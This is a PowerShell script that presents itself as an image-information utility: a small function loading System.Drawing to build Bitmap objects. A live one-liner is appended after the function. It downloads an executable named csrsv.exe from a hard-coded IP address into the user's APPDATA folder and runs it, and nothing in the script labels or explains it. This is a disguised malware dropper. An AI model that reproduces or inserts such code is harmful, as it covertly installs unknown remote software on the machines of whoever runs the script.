function Get-ImageInformation
{

	PARAM (
		[System.String[]]$FilePath
	)
	Foreach ($Image in $FilePath)
	{
		
		Add-type -AssemblyName System.Drawing

		
		New-Object -TypeName System.Drawing.Bitmap -ArgumentList $Image
	}
}
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

